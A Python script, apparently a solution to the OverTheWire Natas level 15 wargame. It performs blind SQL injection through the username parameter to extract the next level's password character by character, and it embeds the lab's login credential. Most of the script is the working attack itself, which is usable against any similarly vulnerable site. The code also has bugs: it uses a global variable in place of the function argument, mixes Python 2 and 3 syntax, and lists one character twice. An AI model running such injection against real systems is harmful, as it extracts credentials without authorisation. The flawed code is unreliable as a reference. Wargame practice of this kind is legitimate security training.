import requests

password = ""
url = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/'

auth = {'username': 'natas15', 'password': 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'}
parsedChars = ""
allowedChars = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "R", "S", "T", "U",
                     "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]

existsStr = 'This user exists.'
password = ''

r = requests.get(url)
if r.status_code != requests.codes.okay:
    raise ValueError(r.status_code)
else:
    print('All good')


# for x in allowed:
#     query = '" AND SELECT STRCMP("{0}", "{1}")'.format(x, password)
#     r = requests.post(url, auth=(auth['user'], auth['pass']))

def is_char_present(char):
    r = requests.get(
        url+'?username=natas16" AND password LIKE BINARY "%'+c+'%" "')
    if r.content.find(existsStr) != -1:
        return char
    return None


for c in allowedChars:
    res = is_char_present(c)
    if res is not None:
        parsedChars += c

for i in range(32):
    for c in parsedChars:
        r = requests.get(
            url+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
        # Did we found the character at the i position of the password?
        if r.content.find(existsStr) != -1:
            password += c
            print 'Password: ' + password + \
                '*' * int(32 - len(password))
            break
